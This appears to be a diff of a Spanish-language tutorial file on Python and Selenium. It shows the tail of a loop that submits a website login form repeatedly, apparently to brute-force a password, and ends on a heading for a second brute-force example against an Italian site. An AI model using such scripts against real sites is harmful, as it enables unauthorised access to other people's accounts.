@@ -52,6 +52,7 @@ for x in range(100):
     clk = driver.find_element_by_xpath('//*[@id="form-ingreso-window"]/button').submit()
     time.sleep(1)
     psw.clear()
+driver.close()
 ```
 ## Ejemplo N°2 de uso de python con selenium (ataque fuerza bruta sitio web italiano)
 
